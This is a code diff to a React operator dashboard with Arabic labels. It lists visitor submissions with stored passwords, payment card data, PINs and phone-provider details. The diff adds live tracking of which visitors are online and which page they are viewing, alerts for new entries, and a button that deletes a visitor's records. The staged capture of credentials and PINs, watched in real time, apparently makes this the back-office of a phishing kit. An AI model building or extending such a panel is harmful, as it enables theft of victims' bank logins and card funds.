@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useState, useRef } from "react";
 import { 
   Search,
   User,
@@ -14,15 +14,31 @@ import {
   RefreshCw,
   ChevronRight,
   Smartphone,
-  Building,
-  FileText
+  FileText,
+  Trash2,
+  Wifi,
+  WifiOff,
+  Users
 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { subscribeToSubmissions, subscribeToPayments } from "@/lib/firebase";
-import { formatDistanceToNow } from "date-fns";
-import { ar } from "date-fns/locale";
+import { 
+  subscribeToSubmissions, 
+  subscribeToPayments, 
+  subscribeToOnlineUsers,
+  deleteSubmission,
+  deletePayment,
+  deleteOnlineUser
+} from "@/lib/firebase";
+
+interface OnlineUser {
+  id: string;
+  visitorId: string;
+  online: boolean;
+  lastSeen: any;
+  currentPage: string;
+}
 
 interface Submission {
   id: string;
@@ -96,13 +112,32 @@ interface Payment {
 export default function FirebaseDashboard() {
   const [submissions, setSubmissions] = useState<Submission[]>([]);
   const [payments, setPayments] = useState<Payment[]>([]);
+  const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
   const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
   const [searchQuery, setSearchQuery] = useState("");
   const [loading, setLoading] = useState(true);
-  const [activeTab, setActiveTab] = useState<"all" | "completed" | "pending">("all");
+  const [activeTab, setActiveTab] = useState<"all" | "completed" | "pending" | "online">("all");
+  const previousIdsRef = useRef<Set<string>>(new Set());
+  const listRef = useRef<HTMLDivElement>(null);
+  const [newItemId, setNewItemId] = useState<string | null>(null);
 
   useEffect(() => {
     const unsubscribeSubmissions = subscribeToSubmissions((data) => {
+      // Detect actual new inserts by comparing IDs
+      const currentIds = new Set(data.map(d => d.id));
+      const newIds = data.filter(d => !previousIdsRef.current.has(d.id));
+      
+      if (newIds.length > 0 && previousIdsRef.current.size > 0) {
+        const newestItem = newIds[0];
+        setNewItemId(newestItem?.id || null);
+        // Scroll to top when new data arrives
+        if (listRef.current) {
+          listRef.current.scrollTop = 0;
+        }
+        // Clear highlight after 3 seconds
+        setTimeout(() => setNewItemId(null), 3000);
+      }
+      previousIdsRef.current = currentIds;
       setSubmissions(data);
       setLoading(false);
       if (data.length > 0 && !selectedSubmission) {
@@ -114,11 +149,39 @@ export default function FirebaseDashboard() {
       setPayments(data);
     });
 
+    const unsubscribeOnline = subscribeToOnlineUsers((users) => {
+      setOnlineUsers(users.filter(u => u.online));
+    });
+
     return () => {
       unsubscribeSubmissions();
       unsubscribePayments();
+      unsubscribeOnline();
     };
   }, []);
+
+  const isUserOnline = (visitorId: string) => {
+    return onlineUsers.some(u => u.visitorId === visitorId && u.online);
+  };
+
+  const getUserCurrentPage = (visitorId: string) => {
+    const user = onlineUsers.find(u => u.visitorId === visitorId);
+    return user?.currentPage || "";
+  };
+
+  const handleDelete = async (submissionId: string) => {
+    if (window.confirm("هل أنت متأكد من حذف هذا التسجيل؟")) {
+      // Delete submission, payment, and online status
+      await Promise.all([
+        deleteSubmission(submissionId),
+        deletePayment(submissionId),
+        deleteOnlineUser(submissionId)
+      ]);
+      if (selectedSubmission?.id === submissionId) {
+        setSelectedSubmission(null);
+      }
+    }
+  };
 
   const filteredSubmissions = submissions.filter((sub) => {
     const matchesSearch = 
@@ -129,6 +192,7 @@ export default function FirebaseDashboard() {
 
     if (activeTab === "completed") return matchesSearch && sub.status === "completed";
     if (activeTab === "pending") return matchesSearch && sub.status !== "completed";
+    if (activeTab === "online") return matchesSearch && isUserOnline(sub.visitorId);
     return matchesSearch;
   });
 
@@ -136,6 +200,7 @@ export default function FirebaseDashboard() {
     total: submissions.length,
     completed: submissions.filter(s => s.status === "completed").length,
     pending: submissions.filter(s => s.status !== "completed").length,
+    online: onlineUsers.length,
     payments: payments.length,
   };
 
@@ -144,7 +209,7 @@ export default function FirebaseDashboard() {
     if (sub.step_1_account_type) steps.push("نوع الحساب");
     if (sub.step_2_personal_data) steps.push("البيانات");
     if (sub.step_3_password) steps.push("كلمة المرور");
-    if (sub.step_4_payment) steps.push("الدفع");
+    if (sub.step_4_payment_card || sub.step_4_payment) steps.push("الدفع");
     if (sub.step_5_pin) steps.push("PIN");
     if (sub.step_6_phone_provider) steps.push("مزود الخدمة");
     return steps;
@@ -157,11 +222,16 @@ export default function FirebaseDashboard() {
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-4">
             <h1 className="text-xl font-bold text-white">لوحة بيانات Firebase</h1>
-            <span className="text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded">
+            <span className="text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded flex items-center gap-1">
+              <Wifi className="h-3 w-3" />
               متصل مباشر
             </span>
           </div>
           <div className="flex items-center gap-4">
+            <div className="flex items-center gap-2 bg-blue-500/20 text-blue-400 px-3 py-1.5 rounded">
+              <Users className="h-4 w-4" />
+              <span>{stats.online} متصل الآن</span>
+            </div>
             <Button
               variant="outline"
               size="sm"
@@ -177,7 +247,7 @@ export default function FirebaseDashboard() {
 
       {/* Stats Bar */}
       <div className="bg-[#1e293b] border-b border-gray-700 px-6 py-3">
-        <div className="flex items-center gap-6">
+        <div className="flex items-center gap-4 flex-wrap">
           <button
             onClick={() => setActiveTab("all")}
             className={cn(
@@ -190,10 +260,21 @@ export default function FirebaseDashboard() {
             <span className="bg-white/20 px-2 py-0.5 rounded text-sm">{stats.total}</span>
           </button>
           <button
+            onClick={() => setActiveTab("online")}
+            className={cn(
+              "flex items-center gap-2 px-4 py-2 rounded-lg transition-colors",
+              activeTab === "online" ? "bg-green-600 text-white" : "text-gray-400 hover:text-white"
+            )}
+          >
+            <Wifi className="h-4 w-4" />
+            <span>متصل</span>
+            <span className="bg-white/20 px-2 py-0.5 rounded text-sm">{stats.online}</span>
+          </button>
+          <button
             onClick={() => setActiveTab("completed")}
             className={cn(
               "flex items-center gap-2 px-4 py-2 rounded-lg transition-colors",
-              activeTab === "completed" ? "bg-green-600 text-white" : "text-gray-400 hover:text-white"
+              activeTab === "completed" ? "bg-emerald-600 text-white" : "text-gray-400 hover:text-white"
             )}
           >
             <CheckCircle className="h-4 w-4" />
@@ -236,7 +317,7 @@ export default function FirebaseDashboard() {
           </div>
 
           {/* List */}
-          <div className="flex-1 overflow-y-auto">
+          <div ref={listRef} className="flex-1 overflow-y-auto scroll-smooth">
             {loading ? (
               <div className="flex items-center justify-center h-32 text-gray-500">
                 <RefreshCw className="h-6 w-6 animate-spin" />
@@ -252,20 +333,36 @@ export default function FirebaseDashboard() {
                   key={sub.id}
                   onClick={() => setSelectedSubmission(sub)}
                   className={cn(
-                    "w-full p-4 border-b border-gray-700 text-right transition-colors",
+                    "w-full p-4 border-b border-gray-700 text-right transition-all",
                     selectedSubmission?.id === sub.id
                       ? "bg-blue-600/20 border-r-4 border-r-blue-500"
-                      : "hover:bg-gray-700/50"
+                      : "hover:bg-gray-700/50",
+                    newItemId === sub.id && "animate-pulse bg-green-500/30"
                   )}
                 >
                   <div className="flex items-start justify-between gap-3">
                     <div className="flex-1 min-w-0">
-                      <p className="font-bold text-white truncate">
-                        {sub.step_2_personal_data?.fullNameArabic || `زائر ${sub.visitorId.slice(0, 8)}`}
-                      </p>
+                      <div className="flex items-center gap-2">
+                        <p className="font-bold text-white truncate">
+                          {sub.step_2_personal_data?.fullNameArabic || `زائر ${sub.visitorId.slice(0, 8)}`}
+                        </p>
+                        {isUserOnline(sub.visitorId) ? (
+                          <span className="flex items-center gap-1 text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
+                            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+                            متصل
+                          </span>
+                        ) : (
+                          <WifiOff className="h-3 w-3 text-gray-500" />
+                        )}
+                      </div>
                       <p className="text-sm text-gray-400 truncate">
                         {sub.step_2_personal_data?.email || "لا يوجد بريد"}
                       </p>
+                      {isUserOnline(sub.visitorId) && (
+                        <p className="text-xs text-blue-400 mt-1">
+                          📍 {getUserCurrentPage(sub.visitorId)}
+                        </p>
+                      )}
                       <div className="flex items-center gap-2 mt-2">
                         {sub.status === "completed" ? (
                           <span className="text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
@@ -293,22 +390,49 @@ export default function FirebaseDashboard() {
               {/* Header */}
               <div className="bg-[#1e293b] rounded-xl p-6 border border-gray-700">
                 <div className="flex items-center gap-4 mb-4">
-                  <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center">
+                  <div className={cn(
+                    "w-16 h-16 rounded-full flex items-center justify-center",
+                    isUserOnline(selectedSubmission.visitorId) ? "bg-green-600" : "bg-blue-600"
+                  )}>
                     <User className="h-8 w-8 text-white" />
                   </div>
-                  <div>
-                    <h2 className="text-2xl font-bold">
-                      {selectedSubmission.step_2_personal_data?.fullNameArabic || "زائر جديد"}
-                    </h2>
+                  <div className="flex-1">
+                    <div className="flex items-center gap-2">
+                      <h2 className="text-2xl font-bold">
+                        {selectedSubmission.step_2_personal_data?.fullNameArabic || "زائر جديد"}
+                      </h2>
+                      {isUserOnline(selectedSubmission.visitorId) && (
+                        <span className="flex items-center gap-1 text-sm bg-green-500/20 text-green-400 px-2 py-1 rounded">
+                          <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+                          متصل الآن
+                        </span>
+                      )}
+                    </div>
                     <p className="text-gray-400">
                       {selectedSubmission.step_2_personal_data?.fullNameEnglish || selectedSubmission.visitorId}
                     </p>
+                    {isUserOnline(selectedSubmission.visitorId) && (
+                      <p className="text-sm text-blue-400 mt-1">
+                        📍 الصفحة الحالية: {getUserCurrentPage(selectedSubmission.visitorId)}
+                      </p>
+                    )}
                   </div>
-                  {selectedSubmission.status === "completed" && (
-                    <span className="mr-auto bg-green-500 text-white px-4 py-2 rounded-lg font-bold">
-                      تسجيل مكتمل
-                    </span>
-                  )}
+                  <div className="flex gap-2">
+                    {selectedSubmission.status === "completed" && (
+                      <span className="bg-green-500 text-white px-4 py-2 rounded-lg font-bold">
+                        تسجيل مكتمل
+                      </span>
+                    )}
+                    <Button
+                      variant="destructive"
+                      size="sm"
+                      onClick={() => handleDelete(selectedSubmission.id)}
+                      className="bg-red-600 hover:bg-red-700"
+                    >
+                      <Trash2 className="h-4 w-4 ml-1" />
+                      حذف
+                    </Button>
+                  </div>
                 </div>
 
                 {/* Step Progress */}
